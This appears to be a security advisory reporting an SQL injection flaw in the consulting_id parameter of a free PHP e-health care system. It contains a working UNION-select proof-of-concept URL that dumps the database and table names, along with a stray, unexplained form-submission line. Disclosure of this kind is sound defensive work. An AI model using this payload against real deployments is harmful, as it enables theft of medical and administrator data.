# E-Health Care System IN PHP consulting_detail.php has SQL injection vulnerability

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
/Admin/consulting_detail.php
## describe
There are unrestricted SQL injection attacks in the health system. Parameters that can be controlled: consulting_id. There are no restrictions on adding consulting_id parameters to SQL statements in the consulting_detail.php. Hackers can gain unauthorized access to sensitive database information and webshells through this vulnerability.
## code analysis
The $_GET['consulting_id'] parameter in consulting_detail.php is controlled and carried directly into the SQL statement, resulting in unauthorized SQL injection.

![image-20241102021903600](https://github.com/user-attachments/assets/ccb2543a-c930-4b04-96ae-19005070d6e9)



## POC

```
http://healthcare/Admin/consulting_detail.php?consulting_id=11%27%20union%20select%20group_concat(table_name),database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20information_schema.tables%20where%20table_schema%20=%20database();--+
```

Get the database name:  online_health_care

Get these tables name:   admin,appointment,comment,consulting_schedule,doc_message,doctor,message,schedule,tbl_comment,user

![image-20241102021537206](https://github.com/user-attachments/assets/066e3281-6fec-411e-82f5-245c50180ad4)

```
password=1&repassword=1&email=1@qq.com&username=1&fname=1&lname=1&submit=submit
```

